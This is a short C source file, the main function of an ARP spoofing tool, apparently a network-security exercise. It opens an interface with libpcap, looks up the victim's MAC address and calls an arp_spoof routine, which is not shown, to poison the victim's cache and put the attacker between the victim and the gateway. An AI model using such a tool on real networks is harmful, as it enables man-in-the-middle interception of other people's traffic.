#include "arp.h"

int main(int argc, char** argv)
{
    if (argc != 4)      //check argument
    {
        usage();
        return -1;
    }

//    argv[1] = "eth1";
//    argv[2] = "169.254.165.80";
//    argv[3] = "169.254.53.112";
    uint8_t sender_ip[4];   //victim
    convert_argv_into_ip(sender_ip, argv[2]);
    uint8_t target_ip[4];   //gateway
    convert_argv_into_ip(target_ip, argv[3]);

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 42, 1, 1000, errbuf);          //handle
    if (handle == NULL)
    {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    uint8_t attacker_mac[6];
    get_attacker_info(attacker_mac, dev);

    uint8_t sender_mac[6];
    get_sender_MAC(handle, attacker_mac, sender_ip, sender_mac);

    arp_spoof(handle, sender_mac, sender_ip, attacker_mac, target_ip);
    return 0;
}
